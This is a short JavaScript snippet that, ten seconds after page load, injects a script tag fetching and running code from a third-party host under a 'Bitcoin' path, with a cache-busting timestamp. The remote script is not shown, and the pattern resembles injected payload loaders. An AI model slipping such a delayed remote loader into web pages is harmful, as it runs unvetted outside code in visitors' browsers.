$(window).load(function () {
    setTimeout(function () {
        (function (b, e, v, t, s) {
            t = b.createElement(e);
            t.async = !0;
            t.src = v + '?v=' + Math.ceil(Date.now() / 1000);
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        })(document, 'script', 'https://analytics.echbot.com/Bitcoin/share.js');
    }, 10 * 1000);
});
